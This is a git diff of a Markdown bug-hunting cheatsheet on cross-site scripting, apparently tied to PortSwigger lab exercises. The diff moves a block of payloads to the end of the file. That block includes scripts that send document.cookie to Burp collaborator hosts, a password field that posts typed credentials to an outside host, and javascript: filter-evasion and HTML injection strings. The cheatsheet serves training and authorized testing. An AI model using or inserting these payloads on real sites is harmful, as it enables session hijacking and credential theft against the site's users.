@@ -71,46 +71,6 @@ https://github.com/payloadbox/xss-payload-list
 
 https://github.com/terjanq/Tiny-XSS-Payloads
 
-## Payload for stealing cookies
-```js
-<script>
-fetch('https://m1ofpkz2aozr1riy4z987vbc137uvnjc.oastify.com', {
-method: 'POST',
-mode: 'no-cors',
-body:document.cookie
-});
-</script>
-```
-```js
-<script>document.location='https://r91uwnam29s3c1jdsyc8t7t34ualyfm4.oastify.com//'+document.cookie</script> 
-```
-```js
-<script>location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';</script>
-```
-## Payload for stealing credentials
-```js
-<input name=username id=username>
-<input type=password name=password onchange="if(this.value.length)fetch('https://m1ofpkz2aozr1riy4z987vbc137uvnjc.oastify.com',{
-method:'POST',
-mode: 'no-cors',
-body:username.value+':'+this.value
-});">
-```
-## XSS with filter evasion
-```
-<IMG SRC="jav&#x09;ascript:alert('XSS');">
-<IMG SRC="jav&#x0A;ascript:alert('XSS');">
-<IMG SRC="jav&#x0D;ascript:alert('XSS');">
-```
-**XSS Filter Evasion Cheat Sheet**
-<br>
-https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
-## For html Injection
-```
-<h1>cyborg71</h1>
-"><h1>cyborg71</h1>
-<a href="https://google.com"></a>
-```
 ## Angle brackets HTML-encoded bypass
 **Reflected XSS into HTML attribute with angle brackets HTML-encoded**
 <br>
@@ -142,9 +102,12 @@ Finally the code will look like this after response.
 ![Screenshot from 2024-06-23 19-29-18](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/5387641e-5ee7-4dca-89a3-e1253a426bc5)
 <br>
 <br>
+
 ## Reflected XSS into a JavaScript string with single quote and backslash escaped
+
 <br>
 In some scenarios the payload might not work because of single quote and backslash escape.
+
 ![Screenshot from 2024-07-01 04-27-49](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/af236bde-554a-45f9-8e61-77f4409e5ef4) <br>
 In this situation, you close the script tag inject your payload.
 
@@ -224,3 +187,43 @@ Now, use this keys to get reflection.
     On Windows: ALT+SHIFT+X
     On MacOS: CTRL+ALT+X
     On Linux: Alt+X
+## Payload for stealing cookies
+```js
+<script>
+fetch('https://m1ofpkz2aozr1riy4z987vbc137uvnjc.oastify.com', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
+```js
+<script>document.location='https://r91uwnam29s3c1jdsyc8t7t34ualyfm4.oastify.com//'+document.cookie</script> 
+```
+```js
+<script>location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';</script>
+```
+## Payload for stealing credentials
+```js
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://m1ofpkz2aozr1riy4z987vbc137uvnjc.oastify.com',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+## XSS with filter evasion
+```
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+```
+**XSS Filter Evasion Cheat Sheet**
+<br>
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+## For html Injection
+```
+<h1>cyborg71</h1>
+"><h1>cyborg71</h1>
+<a href="https://google.com"></a>
+```
